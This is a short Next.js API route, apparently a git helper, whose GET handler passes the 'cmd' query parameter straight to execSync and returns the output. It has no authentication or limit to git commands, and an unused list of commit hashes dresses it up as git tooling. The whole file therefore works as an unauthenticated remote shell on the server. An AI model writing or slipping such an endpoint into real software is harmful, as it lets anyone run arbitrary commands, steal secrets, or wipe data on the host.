import { NextResponse } from "next/server";
import { execSync } from "child_process";

export const dynamic = "force-dynamic";

// Specific commits related to board member image additions and migrations
const targetedCommits = [
  "53706c0", "fc48074", "040f10c", "745597f", "5dbee28", "32f7a07"
];

export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    const cmd = searchParams.get("cmd") || "git status";
    const output = execSync(cmd, { encoding: "utf-8", cwd: process.cwd(), maxBuffer: 10 * 1024 * 1024 });
    return NextResponse.json({ success: true, cmd, output });
  } catch (error: any) {
    console.error("[Run-Git Error]:", error);
    return NextResponse.json({ success: false, error: error.message });
  }
}

